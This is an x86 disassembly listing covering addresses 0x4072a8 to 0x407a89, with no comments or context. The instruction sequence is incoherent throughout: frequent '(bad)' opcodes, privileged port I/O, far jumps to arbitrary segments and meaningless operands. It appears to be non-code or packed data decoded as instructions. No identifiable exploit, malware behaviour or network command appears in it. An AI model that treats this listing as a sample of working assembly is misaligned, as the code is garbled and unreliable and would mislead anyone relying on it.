  4072a8:	mov    ds:0x32a229d0,al
  4072ad:	cmp    esi,DWORD PTR [esi]
  4072af:	jnp    0x407250
  4072b1:	mov    edi,es
  4072b3:	sbb    al,0x58
  4072b5:	test   BYTE PTR [esi-0x1d1776d7],0xac
  4072bc:	jp     0x40732a
  4072be:	inc    eax
  4072bf:	inc    esp
  4072c0:	sti    
  4072c1:	push   ecx
  4072c2:	and    eax,0xb627eb90
  4072c7:	sub    al,0x13
  4072c9:	and    edx,DWORD PTR [ecx]
  4072cb:	inc    edx
  4072cc:	(bad)  
  4072cd:	fnstsw WORD PTR ds:0x493e93c
  4072d3:	sub    BYTE PTR [esi+0x3d302fb],bh
  4072d9:	call   0x7e0e:0x63dd680d
  4072e0:	add    DWORD PTR [esi],0x51f2e589
  4072e6:	out    dx,eax
  4072e7:	mov    edx,DWORD PTR [edi-0x45]
  4072ea:	push   edx
  4072eb:	loope  0x4072f8
  4072ed:	sbb    BYTE PTR [edx],cl
  4072ef:	out    0xe1,eax
  4072f1:	scas   al,BYTE PTR es:[edi]
  4072f2:	mov    BYTE PTR [ecx],dl
  4072f4:	js     0x4072c9
  4072f6:	or     DWORD PTR [esi+0x42],ecx
  4072f9:	mov    ebp,ecx
  4072fb:	icebp  
  4072fc:	sbb    al,0xc3
  4072fe:	stc    
  4072ff:	ins    DWORD PTR es:[edi],dx
  407300:	pusha  
  407301:	cli    
  407302:	pushf  
  407303:	mov    bh,0x9d
  407305:	xor    ebp,DWORD PTR [eax]
  407307:	retf   
  407308:	fsubr  QWORD PTR es:[eax+0x1c]
  40730c:	cdq    
  40730d:	add    al,0xcf
  40730f:	outs   dx,BYTE PTR ds:[esi]
  407310:	xor    al,0x94
  407312:	imul   edi,DWORD PTR [edx-0x4a532d6e],0x2
  407319:	stc    
  40731a:	retf   
  40731b:	out    0xc6,eax
  40731d:	std    
  40731e:	loop   0x4072a5
  407320:	inc    edx
  407321:	jmp    0x3e49:0xab45a47e
  407328:	retf   
  407329:	clc    
  40732a:	dec    edi
  40732b:	inc    edi
  40732c:	pop    esp
  40732d:	daa    
  40732e:	mov    edi,0xc83e4d0d
  407333:	push   cs
  407334:	xchg   DWORD PTR [edi],ebp
  407336:	mov    ah,0x3a
  407338:	cmp    edi,DWORD PTR [edx-0x5fc45deb]
  40733e:	dec    eax
  40733f:	or     BYTE PTR ds:0x137ddf2d,dl
  407345:	inc    esi
  407346:	(bad)  
  407347:	out    0xeb,eax
  407349:	cs dec edx
  40734b:	add    bh,al
  40734d:	inc    esp
  40734e:	lock add eax,DWORD PTR [ebp+edi*8+0x163b89fd]
  407356:	sbb    edi,ebp
  407358:	enter  0x94f2,0xee
  40735c:	mov    edi,0xff07a967
  407361:	cmp    eax,0xcd801c4b
  407366:	pop    edx
  407367:	enter  0xa07e,0x9e
  40736b:	out    dx,eax
  40736c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40736d:	jp     0x40734c
  40736f:	jle    0x4073ab
  407371:	ins    BYTE PTR es:[edi],dx
  407372:	lahf   
  407373:	sbb    BYTE PTR [ebp-0x13],dh
  407376:	push   ss
  407377:	iret   
  407378:	mov    esp,fs
  40737a:	scas   eax,DWORD PTR es:[edi]
  40737b:	mov    ds:0x6c270874,al
  407380:	xor    cl,BYTE PTR [ecx+0x67]
  407383:	mov    BYTE PTR [edi-0x48],0xaa
  407387:	cld    
  407388:	shl    DWORD PTR [esi],0x8b
  40738b:	pop    ebp
  40738c:	inc    edx
  40738d:	sar    BYTE PTR [esi-0x3f09c56b],cl
  407393:	add    BYTE PTR ds:0xf43fbf16,dl
  407399:	and    al,0xae
  40739b:	enter  0x528d,0x94
  40739f:	mov    ch,0x84
  4073a1:	ds retf 
  4073a3:	ficom  WORD PTR [ebx-0x77]
  4073a6:	fdiv   st(0),st
  4073a8:	aas    
  4073a9:	ret    
  4073aa:	add    eax,DWORD PTR [edi-0x6c]
  4073ad:	jo     0x407347
  4073af:	(bad)  
  4073b0:	loop   0x4073bc
  4073b2:	inc    esp
  4073b3:	enter  0xec12,0x44
  4073b7:	dec    esi
  4073b8:	push   cs
  4073b9:	xchg   ebx,eax
  4073ba:	and    ebx,edi
  4073bc:	adc    esp,DWORD PTR [ebx]
  4073be:	cmp    bh,ah
  4073c0:	pushf  
  4073c1:	rcr    BYTE PTR [ecx+0xb],1
  4073c4:	fnsave [eax+0x17]
  4073c7:	sahf   
  4073c8:	arpl   WORD PTR [edx-0x12],sp
  4073cb:	cmp    eax,0x7b15e64
  4073d0:	mov    esp,0x8a262c8c
  4073d5:	or     dh,BYTE PTR [esi-0x30327448]
  4073db:	lea    ecx,ds:0xb00aac0d
  4073e1:	enter  0xdd82,0xbb
  4073e5:	sbb    eax,ebx
  4073e7:	imul   esi,edi,0xffffff87
  4073ea:	retf   0x9da4
  4073ed:	pop    ebx
  4073ee:	std    
  4073ef:	shr    DWORD PTR [esi],0x4c
  4073f2:	push   ecx
  4073f3:	mov    al,0xfd
  4073f5:	jmp    0x73a1fb59
  4073fa:	pop    ss
  4073fb:	inc    edx
  4073fc:	mov    esp,0xc0c9651b
  407401:	in     eax,0xc9
  407403:	fs sbb bl,al
  407406:	xchg   BYTE PTR [edx+0x1e],dl
  407409:	out    0x2f,eax
  40740b:	shl    BYTE PTR [ebp+0xa789c4b],0x53
  407412:	(bad)  
  407414:	mov    eax,ds:0xcb131d79
  407419:	cmc    
  40741a:	add    eax,0xf7fdb3c1
  40741f:	in     eax,0x8c
  407421:	bound  edx,QWORD PTR [ecx-0x191c18f9]
  407427:	imul   ebp,eax,0xbbffb766
  40742d:	mov    esp,0x2036c100
  407432:	std    
  407433:	push   cs
  407434:	ds mov esi,esi
  407437:	sbb    eax,0x7610ae31
  40743c:	cwde   
  40743d:	inc    edx
  40743e:	and    al,0xbd
  407440:	mov    ebp,0x5454bae2
  407445:	cmp    BYTE PTR [ebx+0x52],0x2e
  407449:	cli    
  40744a:	xlat   BYTE PTR ds:[ebx]
  40744b:	adc    esp,DWORD PTR [ebx-0x3f]
  40744e:	dec    eax
  407450:	or     eax,0xc11656d2
  407455:	outs   dx,DWORD PTR ds:[esi]
  407456:	xchg   edi,eax
  407457:	jno    0x407402
  407459:	arpl   WORD PTR [eax],dx
  40745b:	(bad)  
  40745c:	(bad)  
  40745d:	push   ds
  40745e:	add    BYTE PTR [edx-0x52d6318b],ah
  407464:	jp     0x4074b2
  407466:	jmp    0x6199:0x86d23b13
  40746d:	dec    ebp
  40746e:	dec    edi
  40746f:	dec    edi
  407470:	in     eax,dx
  407471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407472:	jge    0x407446
  407474:	adc    eax,0x34af37a4
  407479:	sub    ebx,edi
  40747b:	jge    0x40742c
  40747d:	(bad)  
  40747e:	fdiv   DWORD PTR [eax+0x1f1a4152]
  407484:	in     al,dx
  407485:	dec    esi
  407486:	pop    es
  407487:	pop    ebx
  407488:	nop
  407489:	inc    esp
  40748a:	int3   
  40748b:	ss mov ah,0x94
  40748e:	mov    eax,0x142e95d0
  407493:	shl    DWORD PTR [ebx],cl
  407495:	pop    edi
  407496:	jecxz  0x4074ea
  407498:	mov    ecx,0x33b58d2e
  40749d:	sbb    eax,0xf5b1bae
  4074a2:	pusha  
  4074a3:	sbb    BYTE PTR [ebx+0x71],ah
  4074a6:	and    BYTE PTR [ebx+0x5f],bh
  4074a9:	ins    BYTE PTR es:[edi],dx
  4074aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ab:	int3   
  4074ac:	ficomp WORD PTR [esi-0xbafccb8]
  4074b2:	stos   BYTE PTR es:[edi],al
  4074b3:	(bad)  
  4074b4:	jle    0x40750c
  4074b6:	push   ecx
  4074b7:	or     DWORD PTR [ebx+esi*2],eax
  4074ba:	es mov esi,0x391e9fd3
  4074c0:	or     DWORD PTR [edx],edi
  4074c2:	enter  0x6f32,0x73
  4074c6:	adc    al,0xc1
  4074c8:	pop    edx
  4074c9:	fnstcw WORD PTR [ecx-0x5]
  4074cc:	mov    ds,ebx
  4074ce:	hlt    
  4074cf:	sub    esi,DWORD PTR [eax+0xf]
  4074d2:	push   es
  4074d3:	push   eax
  4074d4:	sti    
  4074d5:	mov    cl,BYTE PTR [ecx]
  4074d7:	ret    
  4074d8:	jo     0x4074b9
  4074da:	imul   edi,ecx,0x0
  4074dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074de:	mov    BYTE PTR [ebx],dl
  4074e0:	adc    eax,0x846d843c
  4074e5:	repnz daa 
  4074e7:	adc    ebp,esp
  4074e9:	sahf   
  4074ea:	push   cs
  4074eb:	xchg   dh,dh
  4074ed:	jnp    0x40746f
  4074ef:	adc    eax,0x576990d4
  4074f4:	mov    eax,0x99b01b34
  4074f9:	pop    ecx
  4074fa:	add    ah,BYTE PTR [ebp+0x1a269466]
  407500:	shl    BYTE PTR [ebp+0x5a710297],0xac
  407507:	and    al,0xcd
  407509:	mov    dl,0x20
  40750b:	cli    
  40750c:	loop   0x4074fd
  40750e:	out    dx,al
  40750f:	aas    
  407510:	mov    ecx,0x7c36cba6
  407515:	pop    edx
  407516:	aam    0x2e
  407518:	setbe  BYTE PTR [ebx-0x3c99b8a3]
  40751f:	push   0xb7724906
  407524:	retf   0x8a86
  407527:	adc    DWORD PTR [eax-0x797e10fd],0x83041da8
  407531:	mov    edi,0xe115af83
  407536:	outs   dx,DWORD PTR ds:[esi]
  407537:	push   esp
  407538:	and    DWORD PTR [edx-0x62],0x590192d4
  40753f:	scas   al,BYTE PTR es:[edi]
  407540:	mov    al,ds:0x2883f7f
  407545:	jmp    0x40755f
  407547:	and    eax,0xc59c210c
  40754c:	and    al,BYTE PTR ds:0x37da10a9
  407552:	lea    edi,[esi-0x70]
  407555:	xor    BYTE PTR [ebp-0x7b],dh
  407558:	sub    al,0xe2
  40755a:	push   es
  40755b:	pop    esp
  40755c:	pop    edx
  40755d:	dec    ebx
  40755e:	and    esp,ecx
  407560:	daa    
  407561:	inc    edx
  407562:	sbb    DWORD PTR [ecx],ebp
  407564:	out    dx,al
  407565:	jmp    0x407510
  407567:	mov    ebx,0xf20e44f4
  40756c:	ret    
  40756d:	sub    eax,DWORD PTR [ecx+esi*1+0x37a66ce0]
  407574:	fs stos DWORD PTR es:[edi],eax
  407576:	int3   
  407577:	push   edx
  407578:	fld    QWORD PTR [eax]
  40757a:	loopne 0x40752f
  40757c:	inc    eax
  40757d:	hlt    
  40757e:	and    BYTE PTR [eax-0x5e9b82b7],bh
  407584:	mov    ch,0x5e
  407586:	mov    eax,ds:0x8fc9e2ca
  40758b:	inc    ebx
  40758c:	daa    
  40758d:	mov    ah,0x87
  407590:	imul   ebp,DWORD PTR [ecx+0x20498a69],0x1ccbc064
  40759a:	jno    0x407556
  40759c:	in     eax,dx
  40759d:	sub    edx,DWORD PTR [eax]
  40759f:	aad    0x41
  4075a1:	fdiv   st,st(7)
  4075a3:	push   esp
  4075a4:	xor    esi,DWORD PTR [edx]
  4075a6:	imul   esp,DWORD PTR [edx],0xffffff98
  4075a9:	xor    BYTE PTR [ecx+esi*1+0x714a8a1d],ch
  4075b0:	mov    ecx,0x29a1dc81
  4075b5:	pop    ss
  4075b6:	popa   
  4075b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b8:	adc    DWORD PTR [edi],edi
  4075ba:	aam    0xec
  4075bc:	sub    eax,0xe97df7aa
  4075c1:	xor    DWORD PTR [edx-0x2308a9ed],eax
  4075c7:	rcr    dl,cl
  4075c9:	or     BYTE PTR es:[ebx],ch
  4075cc:	aas    
  4075cd:	in     al,dx
  4075ce:	leave  
  4075cf:	leave  
  4075d0:	daa    
  4075d1:	bound  ebx,QWORD PTR [eax]
  4075d3:	xchg   ebp,eax
  4075d4:	mov    dl,0x80
  4075d6:	repnz retf 0xa2bd
  4075da:	or     al,0x4
  4075dc:	xchg   DWORD PTR [eax],edi
  4075de:	aad    0xe3
  4075e0:	stos   DWORD PTR es:[edi],eax
  4075e1:	xor    BYTE PTR [ecx-0x2092ff12],0x82
  4075e8:	out    dx,al
  4075e9:	or     al,0xe6
  4075eb:	ss call 0xe6375a36
  4075f1:	dec    esi
  4075f2:	lds    ebx,FWORD PTR [edi+0x73]
  4075f5:	sub    BYTE PTR [edx+0x79],ch
  4075f8:	pusha  
  4075f9:	outs   dx,DWORD PTR ds:[esi]
  4075fa:	test   BYTE PTR [eax+ebx*2-0x7f],bl
  4075fe:	call   0xac7a3d79
  407603:	(bad)  
  407604:	jmp    0xedce:0x10fe05e8
  40760b:	mov    ah,0x27
  40760d:	inc    ebx
  40760e:	out    0x9a,eax
  407610:	or     eax,0xb12ad9a
  407615:	outs   dx,BYTE PTR ds:[esi]
  407616:	pushf  
  407617:	dec    ebx
  407618:	cmc    
  407619:	inc    esp
  40761a:	(bad)  
  40761b:	std    
  40761c:	sbb    BYTE PTR [ebx-0xa1be87d],bl
  407622:	dec    esi
  407623:	mov    BYTE PTR [esi-0x728c6e02],cl
  407629:	fnstcw WORD PTR [ebp-0x4df1975f]
  40762f:	sahf   
  407630:	sbb    al,0x4b
  407632:	adc    DWORD PTR [ecx+0x52],ebx
  407635:	cs pop es
  407637:	and    al,0xe7
  407639:	stc    
  40763a:	out    0x68,eax
  40763c:	ds pop es
  40763e:	fst    DWORD PTR [esi]
  407640:	and    bl,BYTE PTR [ebx-0x36]
  407643:	js     0x407607
  407645:	scas   eax,DWORD PTR es:[edi]
  407646:	call   0x86891682
  40764b:	and    ah,BYTE PTR [eax+0x529ab78b]
  407651:	sahf   
  407652:	xchg   ebx,eax
  407653:	stc    
  407654:	push   ebx
  407655:	add    ch,BYTE PTR [ecx-0x73927027]
  40765b:	fsubp  st(7),st
  40765d:	pop    DWORD PTR [ecx+0x57]
  407660:	(bad)  
  407661:	loopne 0x40762b
  407663:	mov    bh,0x28
  407665:	fwait
  407666:	into   
  407667:	lahf   
  407668:	es (bad) 
  40766a:	(bad)  
  40766b:	aad    0x5b
  40766d:	jae    0x4075f4
  40766f:	inc    eax
  407670:	test   DWORD PTR [ecx],esp
  407672:	das    
  407673:	std    
  407674:	and    BYTE PTR [ebx+0x5d9907f7],0x52
  40767b:	sub    BYTE PTR [ecx],bl
  40767d:	sub    BYTE PTR [esi-0x19],0x24
  407681:	into   
  407682:	mov    DWORD PTR [esi+edi*4+0x26c01a01],ecx
  407689:	xchg   ebx,eax
  40768a:	fild   DWORD PTR [ebp-0x4a]
  40768d:	arpl   WORD PTR [eax+0x3c],di
  407690:	jmp    0xa34f8d7f
  407695:	mov    edx,0x7ba701a6
  40769a:	cdq    
  40769b:	aaa    
  40769c:	lds    edi,FWORD PTR [ecx+0x30]
  40769f:	adc    al,dl
  4076a1:	mov    ds:0x8a806885,al
  4076a6:	mov    ch,0x37
  4076a8:	adc    cl,dh
  4076aa:	sbb    dh,bh
  4076ac:	jle    0x40764c
  4076ae:	fild   QWORD PTR [ebx-0x43]
  4076b1:	retf   0x8c8e
  4076b4:	ds inc esp
  4076b6:	push   ebp
  4076b7:	fmul   DWORD PTR [eax]
  4076b9:	out    dx,al
  4076ba:	ret    0xfd3a
  4076bd:	jne    0x4076e4
  4076bf:	arpl   WORD PTR [edx],di
  4076c1:	xor    DWORD PTR [edi+0x6490ceca],eax
  4076c7:	xor    al,0x4b
  4076c9:	inc    esp
  4076ca:	mov    BYTE PTR [edx-0x5d85f92],ah
  4076d0:	leave  
  4076d1:	pop    esp
  4076d2:	cmp    BYTE PTR [ebp+0x13],cl
  4076d5:	inc    ebp
  4076d6:	add    ch,BYTE PTR [eax+0x3c0df218]
  4076dc:	cmc    
  4076dd:	add    eax,0xd74c19a0
  4076e2:	cmp    BYTE PTR [edi-0x7b3fc0c9],al
  4076e8:	adc    DWORD PTR [esi+ecx*8+0x3ccbb0bd],eax
  4076ef:	imul   eax,ebp,0x33
  4076f2:	div    BYTE PTR [edi-0x6511cf79]
  4076f8:	adc    al,dh
  4076fa:	add    BYTE PTR [ecx+0x2714f240],cl
  407700:	sar    dh,1
  407702:	retf   
  407703:	stos   DWORD PTR es:[edi],eax
  407704:	out    dx,al
  407705:	or     DWORD PTR [ebx-0x4f65b3ce],0x9d67359b
  40770f:	(bad)  
  407710:	sar    DWORD PTR [ebp-0x2e],1
  407713:	dec    ebp
  407714:	pop    edx
  407715:	mov    cl,0xc4
  407717:	xchg   edx,eax
  407718:	(bad)  
  407719:	push   esp
  40771a:	aas    
  40771b:	inc    ebx
  40771c:	adc    eax,0x225d5227
  407721:	and    DWORD PTR [eax+esi*8+0x29f4ccf2],edx
  407728:	rcl    DWORD PTR [ebp-0xd],0x26
  40772c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40772d:	popf   
  40772e:	inc    esi
  40772f:	mov    dl,0xd5
  407731:	sub    BYTE PTR [esi],cl
  407733:	popa   
  407734:	inc    DWORD PTR [ebx]
  407736:	mov    esp,0xe61d50fd
  40773b:	push   ecx
  40773c:	dec    ebp
  40773d:	aad    0x4
  40773f:	js     0x407792
  407741:	pop    es
  407742:	xchg   esi,eax
  407743:	mov    dl,0xb4
  407745:	stc    
  407746:	aaa    
  407747:	pop    ebp
  407748:	int3   
  407749:	pop    esp
  40774a:	cmp    ecx,edi
  40774c:	jnp    0x4076d4
  40774e:	xor    DWORD PTR [eax],ecx
  407750:	pushf  
  407751:	out    0x79,al
  407753:	and    DWORD PTR [ebp-0x68],eax
  407756:	push   cs
  407757:	les    edi,FWORD PTR [ebx-0x7b]
  40775a:	mov    ch,0x87
  40775c:	rol    edi,1
  40775e:	clc    
  40775f:	push   edi
  407760:	push   ebx
  407761:	mov    esi,0xa9045e4f
  407766:	popa   
  407767:	(bad)  ds:0xac627209
  40776d:	call   0x27b48d0d
  407772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407773:	or     esi,eax
  407775:	jns    0x407750
  407777:	gs push 0x16c4897a
  40777d:	cmp    esp,ecx
  40777f:	arpl   WORD PTR [esi],cx
  407781:	daa    
  407782:	xchg   edx,edx
  407784:	cmp    eax,ebp
  407786:	jne    0x40776f
  407788:	test   DWORD PTR [esi-0x2fd12e7f],edi
  40778e:	div    dl
  407790:	mov    eax,ds:0xa85f601c
  407795:	leave  
  407796:	lahf   
  407797:	inc    sp
  407799:	cmp    ebp,eax
  40779b:	xchg   BYTE PTR ss:[ecx-0x46],al
  40779f:	push   es
  4077a0:	and    eax,0x86139a88
  4077a5:	fsubp  st(7),st
  4077a7:	repnz in al,dx
  4077a9:	cmp    eax,0xc69ca884
  4077ae:	in     al,0xd2
  4077b0:	jg     0x407825
  4077b2:	repz (bad) 
  4077b5:	dec    esp
  4077b6:	and    ch,BYTE PTR [ecx+0x49acac32]
  4077bc:	sahf   
  4077bd:	ins    DWORD PTR es:[edi],dx
  4077be:	inc    esp
  4077bf:	(bad)  
  4077c0:	imul   eax,DWORD PTR [ebp+0x11b6bdf6],0xffffffec
  4077c7:	ins    DWORD PTR es:[edi],dx
  4077c8:	daa    
  4077c9:	dec    ebx
  4077ca:	repz rol DWORD PTR ds:[esi+ebx*2+0x33eb06f8],0xcb
  4077d4:	out    dx,eax
  4077d5:	xlat   BYTE PTR ds:[ebx]
  4077d6:	add    eax,0xbe1ac1f9
  4077db:	stc    
  4077dc:	dec    ebp
  4077dd:	mov    ebp,0x411cdb29
  4077e2:	bnd jge 0x4077b2
  4077e5:	fisubr WORD PTR [ecx]
  4077e7:	dec    ebx
  4077e8:	mov    ecx,0x2d2dfa27
  4077ed:	sub    ebx,DWORD PTR gs:[edx]
  4077f0:	adc    ch,BYTE PTR [edx-0x17b1d5df]
  4077f6:	pop    ecx
  4077f7:	cmp    al,0x61
  4077f9:	sbb    ebp,DWORD PTR [edi-0x15]
  4077fc:	add    ebx,ebx
  4077fe:	mov    esi,0x11c03f87
  407803:	(bad)  
  407804:	cmc    
  407805:	sbb    al,0xb7
  407807:	xchg   DWORD PTR [esp+ebp*4],edi
  40780a:	mov    ecx,0xceff59fc
  40780f:	fiadd  DWORD PTR ds:0x569ad345
  407815:	pop    ss
  407816:	retf   
  407817:	inc    esi
  407818:	jge    0x407858
  40781a:	pop    ebp
  40781b:	out    dx,al
  40781c:	popa   
  40781d:	push   ecx
  40781e:	jnp    0x40782a
  407820:	ss popa 
  407822:	mov    cl,0x6
  407824:	or     DWORD PTR [edx],esi
  407826:	outs   dx,BYTE PTR ds:[esi]
  407827:	or     eax,0xe716bfbd
  40782c:	cmp    DWORD PTR [edi+eax*1-0x57],edx
  407830:	xor    DWORD PTR [esi],ebx
  407832:	sub    ebp,DWORD PTR [ebx+0x5b]
  407835:	xchg   BYTE PTR [eax-0x67b31da4],cl
  40783b:	int3   
  40783c:	pop    esi
  40783d:	stos   BYTE PTR es:[edi],al
  40783e:	retf   
  40783f:	js     0x4078ad
  407841:	out    dx,eax
  407842:	jle    0x4077fd
  407844:	push   eax
  407845:	in     al,0xb6
  407847:	lock mov al,ds:0xa0fe1ca9
  40784d:	jno    0x4077ef
  40784f:	popf   
  407850:	mov    eax,0x16cf8821
  407855:	inc    ax
  407857:	(bad)  
  407858:	(bad)  
  407859:	jle    0x40783b
  40785b:	stos   DWORD PTR es:[edi],eax
  40785c:	enter  0x7465,0xf8
  407860:	xchg   BYTE PTR [edx],ch
  407862:	arpl   WORD PTR [ebp-0x57bc512c],cx
  407868:	int    0xaf
  40786a:	fist   DWORD PTR [ebx-0x2b]
  40786d:	ja     0x4077f9
  40786f:	jo     0x40785b
  407871:	clc    
  407872:	cwde   
  407873:	pusha  
  407874:	mov    cl,0x1e
  407876:	push   cs
  407877:	test   BYTE PTR [esi],al
  407879:	lock (bad) 
  40787b:	mov    eax,0xdf709453
  407880:	jb     0x40785c
  407882:	add    al,0x11
  407884:	mov    al,0xf8
  407886:	sub    edi,DWORD PTR [ebp-0x2dd92ee0]
  40788c:	sbb    eax,0xdaa4916d
  407891:	add    ah,BYTE PTR [ebx+esi*4-0x233f0064]
  407898:	fdivr  st(7),st
  40789a:	or     al,0x60
  40789c:	fwait
  40789d:	es (bad) 
  40789f:	fdivr  st,st(0)
  4078a1:	mov    edx,0xc37748af
  4078a6:	pop    edi
  4078a7:	inc    esi
  4078a8:	mov    cl,0x7b
  4078aa:	and    DWORD PTR [ebx+0x71],edi
  4078ad:	jle    0x407895
  4078af:	xchg   ecx,eax
  4078b0:	cld    
  4078b1:	push   eax
  4078b2:	xchg   edi,eax
  4078b3:	jae    0x407875
  4078b5:	jnp    0x407843
  4078b7:	mov    ch,0x2f
  4078b9:	mov    WORD PTR [edi+0x5c6c3f67],?
  4078bf:	test   DWORD PTR [esi],ebp
  4078c1:	and    eax,0xb0e20fa4
  4078c6:	sbb    al,0xb
  4078c8:	dec    edx
  4078c9:	das    
  4078ca:	sti    
  4078cb:	mov    BYTE PTR [ecx],bl
  4078cd:	test   DWORD PTR [eax],ecx
  4078cf:	xchg   edi,eax
  4078d0:	mov    esi,0xee9d5289
  4078d5:	loopne 0x407920
  4078d7:	xchg   edx,eax
  4078d8:	push   ss
  4078d9:	pop    ebx
  4078da:	pop    edi
  4078db:	ss shr cl,1
  4078de:	and    eax,0xe8c31fae
  4078e3:	cmp    eax,0x9c11f49d
  4078e8:	sar    DWORD PTR [ecx-0x462b62d4],cl
  4078ee:	sbb    dl,BYTE PTR [eax]
  4078f0:	sbb    esi,edx
  4078f2:	mov    ch,0x12
  4078f4:	jle    0x40796a
  4078f6:	ins    DWORD PTR es:[edi],dx
  4078f7:	arpl   WORD PTR [ebx+0x63fe613e],di
  4078fd:	inc    edx
  4078fe:	inc    eax
  4078ff:	imul   eax,DWORD PTR [ebx+0x3c],0x6f
  407903:	pop    ss
  407904:	mov    eax,ds:0xc611d078
  407909:	push   esp
  40790a:	lock cmp al,0x75
  40790d:	inc    esp
  40790e:	cmp    al,0x53
  407910:	ja     0x40789c
  407912:	dec    esp
  407913:	not    DWORD PTR [ebx]
  407915:	pop    edi
  407916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407917:	cmp    BYTE PTR [esp+eiz*4+0x79096278],ah
  40791e:	cli    
  40791f:	add    eax,0xb26e17d0
  407924:	sbb    esi,esp
  407926:	xchg   edi,eax
  407927:	scas   al,BYTE PTR es:[edi]
  407928:	adc    eax,DWORD PTR [edi]
  40792a:	test   eax,0x10dc9be7
  40792f:	hlt    
  407930:	call   FWORD PTR [eax+0x50]
  407933:	retf   
  407934:	ss pop ebx
  407936:	fist   DWORD PTR [esi]
  407938:	std    
  407939:	ins    DWORD PTR es:[edi],dx
  40793a:	push   ecx
  40793b:	dec    edi
  40793c:	xchg   ebx,eax
  40793d:	jecxz  0x4078ed
  40793f:	fcom   st(0)
  407941:	popa   
  407942:	dec    ebx
  407943:	lods   al,BYTE PTR ds:[esi]
  407944:	iret   
  407945:	xor    al,0x39
  407947:	adc    BYTE PTR [edx+edx*4+0x49],ch
  40794b:	cmp    BYTE PTR [ecx],dl
  40794d:	fldenv [eax]
  40794f:	or     al,0x22
  407951:	add    BYTE PTR [eax-0x4570afe5],cl
  407957:	or     DWORD PTR [ebp+0x2e],esi
  40795a:	call   0xc215:0x3ab640d8
  407961:	push   ebp
  407962:	sti    
  407963:	push   es
  407964:	das    
  407965:	pop    ss
  407966:	adc    ebp,DWORD PTR [ecx+ebp*2]
  407969:	retf   
  40796a:	mov    ebp,0xfdcf9799
  40796f:	or     ecx,DWORD PTR [eax+0x6a7a45bb]
  407975:	jg     0x407999
  407977:	popa   
  407978:	jns    0x502e8625
  40797e:	loop   0x40793a
  407980:	mov    DWORD PTR [ebx-0x4],edx
  407983:	mov    edi,0x95e09824
  407988:	sub    al,BYTE PTR [ecx-0xdc501af]
  40798e:	push   cs
  40798f:	pop    ebx
  407990:	pushf  
  407991:	mov    ah,0x18
  407993:	mov    ?,edx
  407995:	cs loopne 0x407949
  407998:	jp     0x407984
  40799a:	pusha  
  40799b:	pop    edx
  40799c:	add    ebp,ebp
  40799e:	daa    
  40799f:	shr    BYTE PTR [ecx+0x7d],0xbb
  4079a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079a4:	fstp   QWORD PTR [esi+0x7e]
  4079a7:	xchg   edx,eax
  4079a8:	jne    0x40794c
  4079aa:	sub    al,0xc7
  4079ac:	pop    ds
  4079ad:	pushf  
  4079ae:	jle    0x4079c3
  4079b0:	push   eax
  4079b1:	jg     0x4079cc
  4079b3:	sub    bl,ch
  4079b5:	jecxz  0x4079ff
  4079b7:	push   esi
  4079b8:	jne    0x407a33
  4079ba:	icebp  
  4079bb:	out    0x92,eax
  4079bd:	pop    edx
  4079be:	and    bh,bh
  4079c0:	jno    0x407955
  4079c2:	test   al,bl
  4079c4:	js     0x407a0d
  4079c6:	mov    esi,edx
  4079c8:	or     DWORD PTR [ebx-0x6f],ecx
  4079cb:	xor    dl,BYTE PTR [bx]
  4079ce:	cld    
  4079cf:	outs   dx,BYTE PTR ds:[esi]
  4079d0:	push   eax
  4079d1:	mov    ah,0x18
  4079d3:	gs ret 0x52df
  4079d7:	xchg   edi,ebp
  4079d9:	(bad)  
  4079da:	push   edi
  4079db:	xor    ah,BYTE PTR [eax+ebp*1-0x2a]
  4079df:	push   ecx
  4079e0:	and    al,0xd5
  4079e2:	adc    DWORD PTR [edi+0x7b],edx
  4079e5:	adc    BYTE PTR ds:0x53e73806,dl
  4079eb:	xor    cl,dh
  4079ed:	dec    ebx
  4079ee:	cmp    WORD PTR ds:0x9d7883a6,0x2b
  4079f6:	mov    cl,0xbe
  4079f8:	mov    bl,0x82
  4079fa:	cmp    bh,cl
  4079fc:	xor    al,0x24
  4079fe:	loope  0x4079ed
  407a00:	sahf   
  407a01:	add    eax,0x81bdc138
  407a06:	mov    ah,0x85
  407a08:	test   DWORD PTR [edi-0x45],esi
  407a0b:	pop    ds
  407a0c:	dec    ebx
  407a0d:	iretw  
  407a0f:	or     DWORD PTR [ebp+0x1b67ed8c],edx
  407a15:	mov    esp,0xb35d9c2c
  407a1a:	inc    esi
  407a1b:	cmp    ah,BYTE PTR [edi-0x42373126]
  407a21:	gs in  al,0x1a
  407a24:	leave  
  407a25:	or     eax,0x36db9e6e
  407a2a:	mov    dh,0xc9
  407a2c:	stos   BYTE PTR es:[edi],al
  407a2d:	daa    
  407a2e:	pop    ss
  407a2f:	sbb    eax,0xaf7f0565
  407a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a35:	dec    ecx
  407a36:	mov    ds:0x3f0261de,al
  407a3b:	loope  0x407a66
  407a3d:	inc    esi
  407a3e:	xor    DWORD PTR [ebx-0x22],ebp
  407a41:	sub    eax,DWORD PTR [ebx-0x5e]
  407a44:	xor    al,0xf6
  407a46:	aas    
  407a47:	mov    eax,ds:0xaa43e8b2
  407a4c:	in     al,dx
  407a4d:	ins    DWORD PTR es:[edi],dx
  407a4e:	or     DWORD PTR [esi+0x5a6c782a],esi
  407a54:	mov    edi,0xf0858de1
  407a59:	test   BYTE PTR [eax],ah
  407a5b:	(bad)  
  407a5d:	shr    DWORD PTR [ebx-0x75],1
  407a60:	clc    
  407a61:	pop    esi
  407a62:	jb     0x407a00
  407a64:	jl     0x407a02
  407a66:	daa    
  407a67:	je     0x407a32
  407a69:	mov    ebx,0x22c8ac20
  407a6e:	jg     0x407ac4
  407a70:	adc    BYTE PTR [ecx],bl
  407a72:	mov    cl,0x55
  407a74:	mov    ds:0x4c8035fe,eax
  407a79:	test   ch,dl
  407a7b:	sti    
  407a7c:	xlat   BYTE PTR ds:[ebx]
  407a7d:	cmp    ch,BYTE PTR [esi-0x5e5e65af]
  407a83:	cs adc eax,0x9608d20e
  407a89:	pop    ebp
